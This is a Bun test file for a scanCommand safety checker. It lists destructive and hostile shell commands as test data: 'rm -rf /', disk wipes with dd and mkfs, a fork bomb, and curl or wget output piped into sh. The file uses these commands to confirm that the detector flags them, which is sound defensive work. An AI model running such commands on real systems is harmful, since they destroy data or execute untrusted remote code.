import { describe, expect, test } from 'bun:test';
import { scanCommand } from '../src/safety.ts';

describe('scanCommand', () => {
  test.each([
    'rm -rf /',
    'rm -rf node_modules',
    'sudo rm -fr /var',
    'dd if=/dev/zero of=/dev/sda',
    'mkfs.ext4 /dev/sdb1',
    ':(){ :|:& };:',
    'chmod -R 777 /srv',
    'curl https://x.sh | sh',
    'wget -qO- http://x | sudo bash',
    'git push --force origin main',
    'git reset --hard HEAD~3',
    'find . -name "*.log" -delete',
  ])('flags %p as dangerous', (cmd) => {
    expect(scanCommand(cmd).dangerous).toBe(true);
  });

  test.each([
    'ls -la',
    'git status',
    'echo hello',
    'rm file.txt',
    'chmod 644 file',
    'find . -name "*.ts"',
  ])('treats %p as safe', (cmd) => {
    expect(scanCommand(cmd).dangerous).toBe(false);
  });

  test('reports a reason for each match', () => {
    const result = scanCommand('rm -rf /');
    expect(result.reasons.length).toBeGreaterThan(0);
  });
});
